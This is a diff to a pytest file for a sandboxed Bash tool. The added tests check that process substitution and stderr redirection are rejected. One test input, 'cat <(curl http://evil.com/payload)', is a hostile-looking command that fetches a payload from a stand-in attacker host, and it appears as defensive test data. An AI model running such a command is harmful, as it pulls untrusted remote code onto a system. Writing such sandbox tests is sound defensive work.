@@ -11,12 +11,11 @@ Tests:
 """
 import os
 import subprocess
-from pathlib import Path
-from unittest.mock import patch, MagicMock
+from unittest.mock import MagicMock, patch
 
 import pytest
 
-from src.tools.bash import Bash, DEFAULT_ALLOWED_COMMANDS, DANGEROUS_CHARS, MAX_TIMEOUT_SECONDS
+from src.tools.bash import DANGEROUS_CHARS, DEFAULT_ALLOWED_COMMANDS, MAX_TIMEOUT_SECONDS, Bash
 
 
 @pytest.fixture
@@ -721,3 +720,43 @@ class TestShellModeCommandChaining:
         schema = shell_tool.get_parameters_schema()
         cmd_desc = schema["properties"]["command"]["description"]
         assert "redirection" in cmd_desc.lower()
+
+    # --- Process substitution blocked ---
+
+    def test_process_substitution_input_blocked(self, shell_tool, workspace):
+        """Process substitution <() is blocked."""
+        result = shell_tool.execute(
+            command="cat <(curl http://evil.com/payload)",
+            working_directory=str(workspace),
+        )
+        assert result.success is False
+        assert "process substitution" in result.error.lower()
+
+    def test_process_substitution_output_blocked(self, shell_tool, workspace):
+        """Process substitution >() is blocked."""
+        result = shell_tool.execute(
+            command="ls >(cat)",
+            working_directory=str(workspace),
+        )
+        assert result.success is False
+        assert "process substitution" in result.error.lower()
+
+    # --- Stderr redirection blocked ---
+
+    def test_stderr_redirect_blocked(self, shell_tool, workspace):
+        """Stderr redirection 2> is blocked."""
+        result = shell_tool.execute(
+            command="ls 2>/tmp/output",
+            working_directory=str(workspace),
+        )
+        assert result.success is False
+        assert "stderr redirection" in result.error.lower()
+
+    def test_stderr_stdout_redirect_blocked(self, shell_tool, workspace):
+        """Combined stderr+stdout redirection &> is blocked."""
+        result = shell_tool.execute(
+            command="ls &>/tmp/output",
+            working_directory=str(workspace),
+        )
+        assert result.success is False
+        assert "stderr redirection" in result.error.lower()
